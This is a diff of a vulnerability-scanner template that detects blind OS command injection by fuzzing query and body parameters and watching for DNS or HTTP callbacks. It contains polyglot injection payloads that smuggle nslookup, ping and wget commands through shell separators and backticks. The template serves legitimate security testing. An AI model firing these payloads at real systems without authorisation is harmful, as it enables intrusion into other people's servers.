@@ -1,5 +1,4 @@
 id: cmdi-blind-oast-polyglot
-
 info:
   name: Blind OS Command Injection
   author: pdteam,geeknik
@@ -12,39 +11,37 @@ info:
     - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
   metadata:
     max-request: 4
-  tags: cmdi,oast,dast,blind,polyglot,vuln
-
+  tags: blind,cmdi,dast,oast,polyglot,vuln
 variables:
-  marker: "{{interactsh-url}}"
-
+  marker: '{{interactsh-url}}'
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
-
+  - fuzzing:
+      - fuzz:
+          - '{{payload}}'
+        parts:
+          - query
+          - body
+        type: postfix
+    matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+      - part: interactsh_protocol
+        type: word
+        words:
+          - http
+          # digest: 4b0a00483046022100ffa659b189fa15afd2deb641d4d7b3ad6fc998004693b214687229e64c044014022100a35d3b3c7ca81690c0c05e027ef0b95752a80e42a98e5902bb995e10d39e35b7:922c64590222798bb761d5b6d8e72950
     payloads:
       payload:
-        - "&nslookup {{marker}}&'\\\"`0&nslookup {{marker}}&`'"
-        - "1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}\";nslookup${IFS}{{marker}};#${IFS}"
-        - "/*$(nslookup {{marker}})`nslookup {{marker}}``*/-nslookup({{marker}})-'/*$(nslookup {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||'\"||nslookup({{marker}})||\"/*`*/"
-        - "$(ping -c 1 {{marker}} | nslookup {{marker}} ; wget {{marker}} -O /dev/null)"
-
-    fuzzing:
-      - part: query
-        type: postfix
-        fuzz:
-          - "{{payload}}"
-
+        - '&nslookup {{marker}}&''\"`0&nslookup {{marker}}&`'''
+        - 1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}";nslookup${IFS}{{marker}};#${IFS}
+        - '/*$(nslookup {{marker}})`nslookup {{marker}}``*/-nslookup({{marker}})-''/*$(nslookup {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||''"||nslookup({{marker}})||"/*`*/'
+        - $(ping -c 1 {{marker}} | nslookup {{marker}} ; wget {{marker}} -O /dev/null)
+    pre-condition:
+      - dsl:
+          - method == "GET"
+          - method == "POST"
+          - method == "PUT"
+        type: dsl
     stop-at-first-match: true
-    matchers:
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "dns"
-
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "http"
-
